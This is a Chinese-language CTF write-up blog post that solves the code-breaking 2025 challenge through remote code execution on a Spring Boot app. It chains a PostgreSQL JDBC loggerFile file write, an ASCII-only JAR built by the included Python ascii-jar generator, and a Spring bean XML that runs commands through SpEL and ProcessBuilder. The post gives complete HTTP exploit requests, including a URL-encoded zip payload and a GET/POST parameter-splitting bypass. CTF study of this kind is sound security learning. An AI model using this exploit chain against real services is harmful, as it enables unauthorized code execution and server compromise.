---
title: "ascii-jar首次操刀解决code-breaking 2025"
onlyTitle: true
date: 2025-4-21 22:59:06
categories:
- ctf
- WP
tags:
- Tomcat
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8150.jpg
---



# ascii-jar首次操刀解决code-breaking 2025

2025code-breaking：https://github.com/phith0n/code-breaking/tree/master/2025

可以打postgresql JDBC Attack

但是不出网情况下写文件是利用如下payload。

```java
jdbc:postgresql://127.0.0.1:11111/test/?loggerLevel=DEBUG&loggerFile=shell.jsp&<%Runtime.getRuntime().exec(\"calc\")};%> =\n
```

看起来只能写可见字符，如果进行URL编码的话，就能写二进制字符串。

虽然是达到了任意写文件的目的，但是目标环境是个springboot项目，打包成fatJAR的形式运行，所以没办法直接写JSP

同时，postgresql JDBC Attack还有一种利用手法就是利用ClassPathXmlApplicationContext 进行spEL注入。因为不能出网的原因受到限制。

于是我们想办法写xml，然后用ClassPathXmlApplicationContext去加载，但是xml前后不能有脏字符，如果有脏字符会会报错`The processing instruction target matching "[xX][mM][lL]" is not allowed.`。从postgresql JDBC Attack的参数来看，loggerFile显然是通过日志写文件，都不用进行分析，前后一定会有很多脏数据，报错数据也会写进去。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421221043940.png)

我们可控的部分只有如下部分。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/4f925839-8642-4a09-86d5-b941e26e8443.png)

众所周知，ClassPathXmlApplicationContext指定加载xml的路径可以是个jar:file:///协议。

为了绕过脏数据的限制，想到用ascii-jar将要加载的XML打包并写入一个zip格式的数据包，然后以`jar:/path/to/payload.zip!/META-INF/resources/poc.xml`的形式进行加载。

哎，现在有同学可能就要问了：这样写入的ZIP包数据前后不是也有脏数据吗？

根据以下分析，jar实际上就是zip格式，JAR被类加载器加载时，必须有中央目录项和EOCD块。而ZIP包前后不仅可以容纳脏数据，而且甚至可以不需要中央目录项和EOCD块

https://godownio.github.io/2025/04/21/2022rwctf-desperate-cat-xue-xi-zi-fu-chuan-xie-jar-wen-jian-he-zang-shu-ju-rao-guo/#%E8%A7%A3%E6%B3%952%EF%BC%9AASCII-JAR%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0

而Spring 的 `ClassPathXmlApplicationContext("classpath:/META-INF/resources/poc.xml")` 走的是标准的 `ClassLoader.getResourceAsStream()`路径。它根本不关心这个 JAR 是不是“合格的 Java JAR”，它只需要找到 `META-INF/resources/poc.xml` 在 zip 结构里的位置，并读取到它的内容

## WP

按理说直接对poc.xml进行压缩后URL编码上传即可，但是`org.postgresql.util.URLCoder#decode`解析JDBC URL如下：以UTF解码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421224815901.png)

ZIP是二进制格式，里面一定包含非ASCII字节

UTF-8 向后兼容 ASCII，0x00–0x7F 的字节在 UTF-8 中就是合法的单字节字符，不需要多字节编码，也不会触发错误。

利用ascii-jar构造ascii字符范围内的jar包

```python
#!/usr/bin/env python
# autor: c0ny1
# date 2022-02-13
from __future__ import print_function

import time
from compress import *

allow_bytes = []
disallowed_bytes = [38,60,39,62,34,40,41] # &<'>"()
for b in range(0,128): # ASCII
    if b in disallowed_bytes:
        continue
    allow_bytes.append(b)


if __name__ == '__main__':
    padding_char = 'A'
    raw_filename = 'poc.xml'
    zip_entity_filename = 'META-INF/resources/poc.xml'
    jar_filename = 'ascii02.jar'
    num = 1
    while True:
        # step1 动态生成java代码并编译
        javaCode = """<?xml version="1.0" encoding="UTF-8"?>
<!-- {PADDING_DATA} -->
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation=" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
            <list>
                <value>touch</value>
                <value>/tmp/success.txt</value>
            </list>
        </constructor-arg>
        <property name="whatever" value="#{pb.start()}"/>
    </bean>
</beans>
            """
        padding_data = padding_char * num
        javaCode = javaCode.replace("{PADDING_DATA}", padding_data)

        f = open(raw_filename, 'w')
        f.write(javaCode)
        f.close()
        time.sleep(0.1)

        # step02 计算压缩之后的各个部分是否在允许的ASCII范围
        raw_data = bytearray(open(raw_filename, 'rb').read())
        compressor = ASCIICompressor(bytearray(allow_bytes))
        compressed_data = compressor.compress(raw_data)[0]
        crc = zlib.crc32(raw_data) % pow(2, 32)

        st_crc = struct.pack('<L', crc)
        st_raw_data = struct.pack('<L', len(raw_data) % pow(2, 32))
        st_compressed_data = struct.pack('<L', len(compressed_data) % pow(2, 32))
        st_cdzf = struct.pack('<L', len(compressed_data) + len(zip_entity_filename) + 0x1e)


        b_crc = isAllowBytes(st_crc, allow_bytes)
        b_raw_data = isAllowBytes(st_raw_data, allow_bytes)
        b_compressed_data = isAllowBytes(st_compressed_data, allow_bytes)
        b_cdzf = isAllowBytes(st_cdzf, allow_bytes)

        # step03 判断各个部分是否符在允许字节范围
        if b_crc and b_raw_data and b_compressed_data and b_cdzf:
            print('[+] CRC:{0} RDL:{1} CDL:{2} CDAFL:{3} Padding data: {4}*{5}'.format(b_crc, b_raw_data, b_compressed_data, b_cdzf, num, padding_char))
            # step04 保存最终ascii jar
            output = open(jar_filename, 'wb')
            output.write(wrap_jar(raw_data,compressed_data, zip_entity_filename.encode()))
            print('[+] Generate {0} success'.format(jar_filename))
            break
        else:
            print('[-] CRC:{0} RDL:{1} CDL:{2} CDAFL:{3} Padding data: {4}*{5}'.format(b_crc, b_raw_data,
                                                                                       b_compressed_data, b_cdzf, num,
                                                                                       padding_char))
        num = num + 1

```

注意xml加脏字符的形式不太一样，不过加到注释里就OK

利用yakit对文件URL编码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421213557590.png)

上传

```http
POST /jdbc?url={{urlenc(jdbc:postgresql:///?a=)}} HTTP/1.1
Host: localhost:8080
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 164

url=%26loggerLevel%3DDEBUG%26loggerFile%3D%2Fapp%2Fascii02.jar%26PK%03%04%0A%00%00%00%08%00%00%00%00%00%0FU%1BV%1E%04%00%00A%03%00%00%1A%00%00%00META-INF%2Fresources%2Fpoc.xmlD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtswWt0GDDwGpDwwwGDtttwGwDtDDtGtDwGtpt3wGwG33333s03333sDDfBDN~%7F%5BkBo%5DWwSG%7BnRzJZRB%5D%7BMGmS%7BCnREyQrVR~%5E%7C%5CNbrrBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABrr%5E%7C%5CNu%5DU%7BwB%7F%5Bk%7BwnRcOOgvjj___JwgWS%7BC%7DWU%5B%5D_GWKJGWCjwMc%5D%5BUju%5DU%7BwRB%7F%5Bk%7Bwv%7FwSnRcOOgvjj___J_fJGWCjFZZzjeIqYMc%5D%5BUrS%7BwOU%7BM%5DRB%7FwSvwMc%5D%5BUqGMUOSG%7BnRBcOOgvjj___JwgWS%7BC%7DWU%5B%5D_GWKJGWCjwMc%5D%5BUju%5DU%7BwBcOOgvjj___JwgWS%7BC%7DWU%5B%5D_GWKJGWCjwMc%5D%5BUju%5DU%7BwjwgWS%7BCru%5DU%7BwJ%7FwmR%5E%7C%5CBBBBNu%5DU%7BBSmnRguRBMkUwwnRsUoUJkU%7BCJiWGM%5Dww%21D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwCiudIbEAt33WDDttGDtGDwGpDDwG03sDwwGwGtwwtwwwGG33333wwG03333GDdFPgCcMm%5B~Eb%5C%5E%5E%5E%5E%5E%5E%5E%5EYuKs%7BG%5BguGK%5Bqe%5B%5DEb%5C%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%5EYcC%7BGEb%5C%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%5EYWecgmEGKgu%7DYiWecgmEb%5C%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%5EYWecgmEiGSki%7Bguum%7B%7BIGOGYiWecgmEb%5C%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%5EYicC%7BGEb%5C%5E%5E%5E%5E%5E%5E%5E%5EYiuKs%7BG%5BguGK%5Bqe%5B%5DEb%5C%5E%5E%5E%5E%5E%5E%5E%5EYk%5BKkm%5BGo%5EseSmy~w%7DeGmWm%5B~%5EWecgmy~A_kUI%7BGe%5BGaQ%7F~iEb%5C%5E%5E%5E%5EYiUmesEb%5CYiUmes%7BEb%5C%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%5E%1EPK%01%02%00%00%0A%00%00%00%08%00%00%00%00%00%0FU%1BV%1E%04%00%00A%03%00%00%1A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00META-INF%2Fresources%2Fpoc.xmlPK%05%06%00%00%00%00%00%00%01%00H%00%00%00V%04%00%00%00%00
```

之所以get和post分别传一个url串，是为了利用特性绕过getParamter，这样在getParameter得到`jdbc:postgresql:///?a=`，而jdbc路由得到的是get+post拼接的串，见https://godownio.github.io/2025/04/17/spel-de-bu-chu-wang-li-yong/#code-breaking2025-wp

然后利用ClassPathXmlApplicationContext加载jar包里的poc.xml

```http
POST /jdbc?url={{urlenc(jdbc:postgresql:///?a=)}} HTTP/1.1
Host: localhost:8080
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 141

url={{urlenc(&socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=jar:file:///app/ascii02.jar!/META-INF/resources/poc.xml)}}
```

执行成功

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421213529757.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421225652967.png)

把上传后的jar包扒下来，可以看到一堆报错日志，但是不影响

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250421224018658.png)